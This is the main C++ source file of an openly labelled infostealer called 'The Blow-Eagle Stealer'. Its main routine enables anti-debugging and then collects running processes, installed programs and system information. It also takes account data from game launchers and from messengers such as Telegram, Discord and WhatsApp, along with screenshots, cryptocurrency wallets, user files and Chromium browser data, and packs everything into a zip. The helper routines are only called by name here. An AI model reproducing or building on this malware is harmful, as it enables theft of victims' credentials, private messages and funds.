/*
|==================================================================================================================|
|████████╗██╗░░██╗███████╗  ██████╗░██╗░░░░░░█████╗░░██╗░░░░░░░██╗░░░░░░███████╗░█████╗░░██████╗░██╗░░░░░███████╗ |
|╚══██╔══╝██║░░██║██╔════╝  ██╔══██╗██║░░░░░██╔══██╗░██║░░██╗░░██║░░░░░░██╔════╝██╔══██╗██╔════╝░██║░░░░░██╔════╝ |
|░░░██║░░░███████║█████╗░░  ██████╦╝██║░░░░░██║░░██║░╚██╗████╗██╔╝█████╗█████╗░░███████║██║░░██╗░██║░░░░░█████╗░░ |
|░░░██║░░░██╔══██║██╔══╝░░  ██╔══██╗██║░░░░░██║░░██║░░████╔═████║░╚════╝██╔══╝░░██╔══██║██║░░╚██╗██║░░░░░██╔══╝░░ |
|░░░██║░░░██║░░██║███████╗  ██████╦╝███████╗╚█████╔╝░░╚██╔╝░╚██╔╝░░░░░░░███████╗██║░░██║╚██████╔╝███████╗███████╗ |
|░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░░░░░░░░╚══════╝╚═╝░░╚═╝░╚═════╝░╚══════╝╚══════╝ |
|                                                                                                                  |
|                               ░██████╗████████╗███████╗░█████╗░██╗░░░░░███████╗██████╗░                          |
|                               ██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗                          |
|                               ╚█████╗░░░░██║░░░█████╗░░███████║██║░░░░░█████╗░░██████╔╝                          |
|                               ░╚═══██╗░░░██║░░░██╔══╝░░██╔══██║██║░░░░░██╔══╝░░██╔══██╗                          |
|                               ██████╔╝░░░██║░░░███████╗██║░░██║███████╗███████╗██║░░██║                          |
|                               ╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚═╝░░╚═╝                          |
|==================================================================================================================|

-----------------------------------------------------------------
|by: Nick_Vinesmoke                                             |
|Autor github: https://github.com/Nick-Vinesmoke                |
|Original repo: https://github.com/Nick-Vinesmoke/The-Blow-Eagle|
-----------------------------------------------------------------
*/

//std:c++17

// main source code file

#include "config/config.cpp"
#include "scripts/scripts.h"
#include "targets/targets.h"

/// <summary>
/// call secure functions
/// </summary>
void Functions();

void SystemInfo();

void Gaming();

void Messengers();

void Other();

void Ending();

/// <summary>
/// Main function in the program. 
/// Function binds and calls all other functions
/// </summary>
/// <param name="none"></param>
/// <returns>0</returns>
int main(void)
{
	Functions();
	
	return 0;
}

void Functions()
{
	if (!config::debuging)
		antidebug::AntiDebug();
	manager::MakeDirs();

	SystemInfo();

	Gaming();

	Messengers();

	Other();

	Ending();
}

void SystemInfo() 
{
	cursystem::GetProcesses();

	cursystem::GetProgs();

	cursystem::GetSysInfo();
}

void Gaming() 
{
	gaming::Steam();

	gaming::Epic();

	gaming::Ubisoft();

	gaming::BattleNet();

	gaming::Minecraft();
}

void Messengers() 
{
	messengers::Telegram();

	messengers::Discord();

	messengers::Skype();

	messengers::Viber();

	messengers::Whatsapp();
}

void Other()
{
	images::Screenshot();
	wallets::Wallets();
	if (!config::enableFileGrubber)
		files::Txt_files();
	if (config::enableFileGrubber)
		files::File_Grabber();
	browsers::Chromium();
	//browsers::FireFox();
}

void Ending() 
{
	manager::MakeZip();
}